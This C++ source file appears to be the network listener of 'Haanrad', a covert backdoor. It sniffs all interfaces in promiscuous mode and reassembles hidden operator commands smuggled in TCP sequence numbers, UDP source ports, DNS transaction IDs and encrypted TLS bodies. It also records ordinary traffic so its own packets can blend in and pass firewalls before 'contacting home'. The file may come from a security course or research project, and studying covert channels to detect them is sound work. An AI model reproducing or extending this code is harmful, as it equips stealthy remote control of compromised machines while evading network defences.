//
// Created by bensoer on 31/10/16.
//

#include <sys/socket.h>
#include <netinet/in.h>
#include <cstdio>
#include <zconf.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>       // struct ip and IP_MAXPACKET (which is 65535)
#include "NetworkMonitor.h"
#include "../../shared/utils/Logger.h"
#include "../../shared/Authenticator.h"
#include "../../shared/PacketIdentifier.h"
#include "../../shared/HCrypto.h"
#include "../../shared/utils/Structures.h"
#include <sys/epoll.h>
#include <pcap.h>
#include <cstring>
#include <algorithm>
#include <dnet.h>

NetworkMonitor * NetworkMonitor::instance = nullptr;

NetworkMonitor::NetworkMonitor(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto, string clientIP) {

    this->crypto = crypto;
    this->trafficAnalyzer = trafficAnalyzer;
    this->clientIP = clientIP;

    this->command = new string("");

    if(!getInterface()){
        Logger::debug("NetworkMonitor - There Was An Error Fetching The Interface For The Monitor");
    }
}

NetworkMonitor* NetworkMonitor::getInstance(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto, string clientIP) {
    if(NetworkMonitor::instance == nullptr){
        NetworkMonitor::instance = new NetworkMonitor(trafficAnalyzer, crypto, clientIP);
    }

    return NetworkMonitor::instance;
}

/**
 * normalizePacket is a helper method that nromalizes all packets destined for the TrafficAnalyzer. This is so that the
 * source port of any packet will match an appropriate system interface Haanrad is operating on and ensure that the port
 * values of the packet are valid for an outgoing packet. This is to ensure the highest chance of success in passing the
 * system firewall
 * @param meta PacketMeta - An object representation of the packet being normalized
 */
void NetworkMonitor::normalizePacket(PacketMeta *meta) {

    char * ptr = meta->packet;
    struct iphdr * ip = (struct iphdr *)ptr;

    in_addr_t da = (in_addr_t)ip->daddr;
    char destinationIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &da, destinationIP, INET_ADDRSTRLEN);
    string strDestinationIP(destinationIP);

    in_addr_t sa = (in_addr_t)ip->saddr;
    char sourceIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &sa, sourceIP, INET_ADDRSTRLEN);
    string strSourceIP(sourceIP);

    for(pcap_if_t * interface = this->allInterfaces; interface != NULL; interface=interface->next){

        for(pcap_addr_t * address = interface->addresses; address != NULL; address=address->next){
            if(address->addr->sa_family == AF_INET){

                //if the packets destination address matches ones of these addresses, then we know it was sent to us
                string interfaceIP(inet_ntoa(((struct sockaddr_in*)address->addr)->sin_addr));

                if(interfaceIP.compare(strDestinationIP)==0){
                    ip->saddr = inet_addr(strDestinationIP.c_str());

                    char * transportLayer = PacketIdentifier::findTransportLayer(meta);
                    if(meta->transportType == TransportType::TCP){
                        struct tcphdr * tcp = (struct tcphdr *)transportLayer;

                        u_int16_t temp = tcp->source;
                        tcp->source = tcp->dest;
                        tcp->dest = temp;
                    }

                    if(meta->transportType == TransportType::UDP){
                        struct udphdr * udp = (struct udphdr *)transportLayer;

                        u_int16_t temp = udp->source;
                        udp->source = udp->dest;
                        udp->dest = temp;
                    }

                    break;
                }

                if(interfaceIP.compare(strSourceIP)==0){
                    ip->daddr = inet_addr(strSourceIP.c_str());

                    //don't need to adjust ports because destination is valid likely in firewall
                    break;
                }

            }
        }
    }
}

/**
 * isFullCommand is a helper function that determines if the command buffer currently contains the contents of a full
 * HAAN packet. A full HAAN packet can then be parsed into a Message object and sent to the console to be presented
 * to the user. isFullCommand also includes checks to clear the buffer if it contains garbage or an invalid packet
 * @return Bool - the state of whether the buffer contains a complete HAAN packet
 */
bool NetworkMonitor::isFullCommand() {

    Logger::debug("NetworkMonitor:isFullCommand - Validating Data Retreived So Far");
    Logger::debug("NetworkMonitor:isFullCommand - Command Currently Is: >" + *this->command + "<");

    //{HAAN 00000000 data HAAN}\0

    if(this->command->length() > 0){
        while(this->command->at(0) != '{' && this->command->length() > 0){
            Logger::debug("NetworkMonitor:isFullCommand - Odd Bits In The Command Buffer. Trimming");
            this->command->erase(0,1);
        }
    }

    //if the first 5 letters don't checkout we should assume data is corrupted and start over
    if(this->command->length() >= 5){
        if(this->command->at(0) != '{' && this->command->at(1) != 'H' && this->command->at(2) != 'A'
                && this->command->at(3) != 'A' && this->command->at(4) != 'N'){
            Logger::debug("NetworkMonitor:isFullCommand - First 5 Letters In Command Don't Match. Assuming Corrupt");
            Logger::debug("NetworkMonitor:isFullCommand - Command Currently Is: >" + *this->command + "<");

            this->command->clear(); //clear the string contents. resetting it

            return false;
        }
    }

    //check it starts with {HAAN
    if(this->command->length() >= 5){
        unsigned long length = this->command->length();
        string end = this->command->substr(length - 5, 5);
        string start = this->command->substr(0,5);
        Logger::debug("NetworkMonitor:isFullCommand - Parsed TAGS. Start: >" + start + "< End: >" + end + "<");
        if(start.compare("{HAAN")!=0){
            return false;
        }

        //check it ends with HAAN}
        if(end.compare("HAAN}")!= 0){
            return false;
        }
    }

    //the length should at minimum be 11 characters
    if(this->command->length() < 11){
        return false;
    }

    return true;
}

/**
 * parseApplicationContent is a helper method that parses out HAAN packet payload information based on the protocol used
 * and specified in the packet meta. All packets sent to this method are assumed to store their HAAN payloads in the
 * applicationLayer.
 * @param meta PacketMeta - An object representation of the packet being parsed for its application layer content
 * @param applicationLayer Char * - A pointer to the application layer in the PacketMeta object
 */
void NetworkMonitor::parseApplicationContent(PacketMeta * meta, char * applicationLayer) {

    if(isOwnPacket(meta)){
        return;
    }

    switch(meta->applicationType){
        case ApplicationType::TLS:{

            struct TLS_HEADER * tls = (struct TLS_HEADER *)applicationLayer;
            char * payload = applicationLayer + sizeof(struct TLS_HEADER);
            string strPayload(payload);

            Logger::debug("NetworkMonitor:parseApplicationContent - Packet is TLS. Data Is In The Body");
            Logger::debug("NetworkMonitor:parseApplicationContent - Body Content: >" + strPayload + "<");

            NetworkMonitor::instance->command->append(strPayload);

            break;
        }
        case ApplicationType::DNS:{

            struct DNS_HEADER * dns = (struct DNS_HEADER *)applicationLayer;

            char content[2];
            memcpy(content, &dns->id, 2);
            string strContent(content);

            Logger::debug("NetworkMonitor:parseApplicationContent - Packet is DNS. Data Is In The Transaction ID");
            Logger::debug("NetworkMonitor:parseApplicationContent - ID Content: >" + strContent + "<");

            NetworkMonitor::instance->command->append(strContent);

            break;
        }
        default:{
            Logger::debug("NetworkMonitor:parseApplicationContent - FATAL ERROR. APPLICATION TYPE UNKNOW");
        }
    }

}

/**
 * parseTransportContent is a helper method that parses out the HAAN packet payload from the transport layer based
 * packets supported by Haanrad. This assumes that all packets passed into parseTransportContent store all of their
 * content on the transport layer
 * @param meta PacketMeta - An object representation of the packet being parsed for transport layer payload
 */
void NetworkMonitor::parseTransportContent(PacketMeta * meta) {

    //check this packet isn't our own
    if(isOwnPacket(meta)){
        return;
    }


    switch(meta->transportType){
        case TransportType::TCP:{




            char * transportLayer = PacketIdentifier::findTransportLayer(meta);
            struct tcphdr * tcp = (struct tcphdr *)transportLayer;

            char content[4];
            memcpy(content, &tcp->seq, 4);

            Logger::debug("NetworkMonitor:parseTransportContent - Packet is TCP. Data Is In The Sequence Number");
            Logger::debug("NetworkMonitor:parseTransportContent - Sequence Content: >" + to_string(content[2]) + "< >" + to_string(content[3]) + "<");

            this->command->append(to_string(content[2]));
            this->command->append(to_string(content[3]));

            break;

        }
        case TransportType::UDP:{

            char * transportLayer = PacketIdentifier::findTransportLayer(meta);
            struct udphdr * udp = (struct udphdr *)transportLayer;

            char content[2];
            memcpy(content, &udp->uh_sport, 2);

            Logger::debug("NetworkMonitor:parseTransportContent - Packet is UDP. Data Is In The Source Port");
            Logger::debug("NetworkMonitor:parseTransportContent - Source Content: >" + to_string(content[1]) + "<");

            this->command->append(to_string(content[1]));

            break;
        }
        default:{
            Logger::debug("NetworkMonitor:parseTransportContent - FATAL ERROR. TRANSPORT TYPE UNKNOWN");
        }
    }
}

/**
 * isOwnPacket is a helper method that determines if the passed in packet is our own. Since libpcap can hear outgoing
 * requests from the client to Haanrad, this method helps seperate these packets
 * @param meta PacketMEta - packet information about the packet in question
 * @return Bool - State as to whether the packet is ours or not. True means it is
 */
bool NetworkMonitor::isOwnPacket(PacketMeta *meta) {

    struct iphdr * ip = (struct iphdr *)meta->packet;

    in_addr_t da = (in_addr_t)ip->daddr;
    char destinationIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &da, destinationIP, INET_ADDRSTRLEN);
    string strDestinationIP(destinationIP);

    if(strDestinationIP.compare(this->clientIP)==0){
        return true;
    }else{
        return false;
    }

}

void NetworkMonitor::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet) {

    //check with SystemState for the current state. If were DORMANT. We Need To Stop!

    char * BUFFER = (char *)(packet + 16);
    struct iphdr * ip = (struct iphdr *)BUFFER;
    int ipHeaderLength = (ip->ihl * 4);
    int protocol = (ip->protocol);

    //just to make sure we are in the right spot
    Logger::debug("NetworkMonitor:packetCallback - IP Header Length: " + to_string(ipHeaderLength));
    Logger::debug("NetworkMonitor:packetCallback - Protocol: " + to_string(protocol));

    PacketMeta meta = PacketIdentifier::generatePacketMeta(BUFFER, pkt_info->len);
    char *applicationLayer = PacketIdentifier::findApplicationLayer(&meta);

    if(applicationLayer == nullptr){
        Logger::debug("NetworkMonitor:listenForTraffic - Could Not Find Application Layer. Can't Do Anything With Packet");
        return;
    }

    //if we are STARTUP. Then as soon as we know its a DNS packet -> put it into the TrafficAnalyzer and halt
    if(SystemState::currentState == SystemState::STARTUP){
        Logger::debug("NetworkMonitor:listenForTraffic - STARTUP State Detected. Only Searching For DNS Packets");
        if(meta.applicationType != ApplicationType::DNS){
            return;
        }else{
            //it is a DNS packet

            //check that it is a request packet
            Logger::debug("NetworkMonitor:listenForTraffic - Found DNS Packet. Confirming Is A Request Packet");
            struct DNS_HEADER * dns = (struct DNS_HEADER *)applicationLayer;
            struct udphdr * udp = (struct udphdr *)PacketIdentifier::findTransportLayer(&meta);
            if(udp != nullptr){
                short destPort = ntohs(udp->dest);
                if(destPort == 53 || destPort == 5353 || destPort == 5355){ //need to control what is possible here
                    if(dns->qr ==0 ){
                        Logger::debug("NetworkMonitor:listenForTraffic - It Is A Request Packet");
                        //this is a query
                        NetworkMonitor::instance->normalizePacket(&meta);
                        NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
                        NetworkMonitor::instance->killListening();
                        return;
                    }
                }
            }else{
                Logger::debug("NetworkMonitor:listenForTraffic - Could Not Find TransportLayer. Can't Parse Packet To Send");
            }

            Logger::debug("NetworkMonitor:listenForTraffic - Packet Is A Response. Can't Use For Contacting Home");
            //this is a response
            return;



        }
    }

    //if it is a TLS packet, the auth information is in the payload. We need to decrypt first before authenticating
    if(meta.applicationType == ApplicationType::TLS){
        Logger::debug("NetworkMonitor:listenForTraffic - Packet Is TLS. Must Decrypt First Before Authenticating");

        //we need to decrypt first before authenticating
        if(NetworkMonitor::instance->crypto->decryptPacket(&meta, applicationLayer) == false){
            Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Decrypting The Packet. Can't Use Packet If It Contains Information");

            //could be a situation here where decryptPacket thought it was TLS but if Authenticator approves it and says its not TLS, something
            //will have gone wrong

            //add the packet to history assuming its not ours
            NetworkMonitor::instance->normalizePacket(&meta);
            NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
            return;
        }else{

            Logger::debug("NetworkMonitor:listenForTraffic - TLS Decryption Successfull. Now Authenticating");
            //now authenticate
            if(Authenticator::isAuthenticPacket(&meta)){
                Logger::debug("NetworkMonitor:listenForTraffic - TLS Packet IS Ours. Parsing Contents");

                NetworkMonitor::instance->parseApplicationContent(&meta, applicationLayer);
            }else{
                Logger::debug("NetworkMonitor:listenForTraffic - TLS Packet Decrypted But Did Not Authenticate");
                //if it is not our packet give it to the TrafficAnalyzer
                //because it decrypted but did not authenticate, its a wierd packet. we nothing to do with it. might be our own anyway
                //NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
            }
        }

        //else this is not a TLS packet and we can Authenticate it first before decrypting
    }else{

        Logger::debug("NetworkMonitor:listenForTraffic - Packet Is Not TLS. Authenticating Before Decryption");
        //authenticate first
        if(Authenticator::isAuthenticPacket(&meta)){

            //then decrypt
            Logger::debug("NetworkMonitor:listenForTraffic - Non-TLS Packet Is Ours. Now Decrypting");

            if(NetworkMonitor::instance->crypto->decryptPacket(&meta, applicationLayer) == false){
                Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Decrypting The Non-TLS Packet. Can't Use Packet If It Contains Information");

                //could be a situation here where decryptPacket thought it was TLS but if Authenticator approves it and says its not TLS, something
                //will have gone wrong

                //add the packet to history assuming its not ours
                //NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
                //because its not TLS, we can authenticate it, it passed authentication, but failed decryption. this could
                //be our own sendout getting caught back in. shouldn't keep it
                return;
            }

            //decryption was successful
            Logger::debug("NetworkMonitor:listenForTraffic - Non-TLS Decryption Successful. Now Parsing Contents");

            if(meta.applicationType != ApplicationType::UNKNOWN){
                Logger::debug("NetworkMonitor:listenForTraffic - Packet Contains Our Data In The Application Layer");
                NetworkMonitor::instance->parseApplicationContent(&meta, applicationLayer);
            }else{
                Logger::debug("NetworkMonitor:listenForTraffic - Packet Contains Our Data In The Transport Layer");
                NetworkMonitor::instance->parseTransportContent(&meta);
            }


        }else{
            Logger::debug("NetworkMonitor:listenForTraffic - Non-TLS Packet Is Not Ours. Add To TrafficAnalyzer");
            NetworkMonitor::instance->normalizePacket(&meta);
            //if it is not our packet give it to the TrafficAnalyzer
            NetworkMonitor::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
        }

    }

    //if we have received the full message then kill listening so that our hanging method will return
    if(NetworkMonitor::instance->isFullCommand()){
        NetworkMonitor::instance->killListening();
    }

}

/**
 * killListening is a helepr method so that the client can tell the NetworkMontior and libpcap to stop listening for
 * packets
 */
void NetworkMonitor::killListening() {
    if(this->currentFD != nullptr){
        pcap_breakloop(this->currentFD);
    }
}

/**
 * getInterface is a helper method that fetches the appropriate "any" interface from libpcap. This is done by fetching
 * all interfaces and searching through them until the "any" interface is found
 * @return Bool - State of whether the interface could be found
 */
bool NetworkMonitor::getInterface() {

    Logger::debug("NetworkMonitor:getInterfaces - Initializing");

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t * interfaces;
    pcap_if_t * interface;

    Logger::debug("NetworkMontor:getInterfaces - Finding All Interfaces");

    if(pcap_findalldevs(&interfaces, errbuf) == -1){
        Logger::debug("NetworkMonitor:getInterfaces - There Was An Error Fetching The Interfaces");
        cerr << errbuf << endl;
        return false;
    }

    Logger::debug("NetworkMonitor:getInterfaces - Looping Through All Interfaces") ;

    allInterfaces = interfaces;
    interface = interfaces;
    while(interface != NULL){
        const char * name = interface->name;

        Logger::debug("NetworkMonitor:getInterfaces - Testing Interface With Name: " + string(name));

        if(strcmp(name, string("any").c_str()) == 0){
            //this is the any interface
            Logger::debug("NetworkMonitor:getInterfaces - FOUND THE ANY INTERFACE");

            listeningInterface = interface;
            return true;
        }

        interface = interface->next;
    }

    return false;
}

/**
 * listenForTraffic is the main startup method for the NetworkMonitor. listenForTraffic configures libpcap and the
 * command buffer for operating and will hang until a full valid HAAN packet has been retrieved from the network.
 * @return String * A complete HAAN packet
 */
string * NetworkMonitor::listenForTraffic() {

    //determine how we should listen - ask the SystemState what the current state is
    //if STARTUP then we need to only listen for DNS packets


    //clear command
    delete(this->command);
    this->command = new string("");

    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 subnetMask;
    bpf_u_int32 ip;

    //fetch network information for interface
    pcap_lookupnet(listeningInterface->name, &subnetMask, &ip, errbuf);

    //open up a raw socket and listen in promisc mode on it for data

    if((this->currentFD = pcap_open_live(listeningInterface->name, BUFSIZ, 1, -1, errbuf)) == NULL){
        Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error in pcap_open_live");
        Logger::debug(string(errbuf));
        return nullptr;
    }

    //setup the libpcap filter
    struct bpf_program fp;
    //compile the filter
    if(pcap_compile(this->currentFD, &fp, "udp or tcp", 0, ip) == -1){
        Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Compiling The Filter");
        return nullptr;
    }
    //set the filter
    if(pcap_setfilter(this->currentFD, &fp) == -1){
        Logger::debug("NetworkMonitor:listenForTraffic - There Was An Error Setting The Filter");
        return nullptr;
    }

    u_char* args = NULL;
    //listen for packets
    pcap_loop(this->currentFD, 0, NetworkMonitor::packetCallback, args);

    return this->command;


    // --------------------------------------------------------------------------------------


/*

    Logger::debug("NetworkMonitor:listenForTraffic - Setting Up For Read");
    char BUFFER[IP_MAXPACKET];

    struct epoll_event events [ this->EPOLL_QUEUE_LENGTH];
    int num_fd = epoll_wait(this->epollDescriptor, events, this->EPOLL_QUEUE_LENGTH, -1);
    if(num_fd < 0){
        Logger::debug("NetworkMonitor:listenForTraffic - Epoll Wait Error");
        return nullptr;
    }

    Logger::debug("NetworkMonitor:listenForTraffic - Epoll Returned. Now Reading Results");
    for(unsigned int i = 0; i < num_fd; i++){

        //check for errors
        if(events[i].events & (EPOLLHUP | EPOLLERR)){
            Logger::debug("NetworkMonitor:listenForTraffic - Epoll Had An Error. Closing Descriptor");
            close(events[i].data.fd);
            continue;
        }

        if(!(events[i].events & EPOLLIN)){
            Logger::debug("NetworkMonitor::listenForTraffic - Critical Error. Event Has Nothing To Read and No Errors. Why is it here?. Skipping For Now");
            continue;
        }

        // if we make it here then everything is fine and we can start reading from the descriptor
        long bytesRead = read(events[i].data.fd, BUFFER, IP_MAXPACKET);

        Logger::debug("NetworkMonitor:listeningForTraffic - Read Complete");

        struct iphdr * ip = (struct iphdr *)BUFFER;
        int ipHeaderLength = (ip->ihl * 4);
        int protocol = (ip->protocol);

        printf("%d\n", ipHeaderLength);
        printf("%d\n", protocol);

        //how do we know its our packet ?
        //using packet identifier need to determine where our payload information is
        //then need to determine how to authenticate it

        PacketMeta meta = PacketIdentifier::generatePacketMeta(BUFFER);
        char *applicationLayer = PacketIdentifier::findApplicationLayer(&meta);

        if(applicationLayer == nullptr){
            Logger::debug("NetworkMonitor:listenForTraffic - Could Not Find Application Layer. Can't Do Anything With Packet");
            continue;
        }else{
            this->crypto->decryptPacket(&meta, applicationLayer);
        }


        if(Authenticator::isAuthenticPacket(BUFFER)){




        }else{
            //if it is not our packet give it to the TrafficAnalyzer
            this->trafficAnalyzer->addPacketMetaToHistory(meta);

        }
    }

*/


}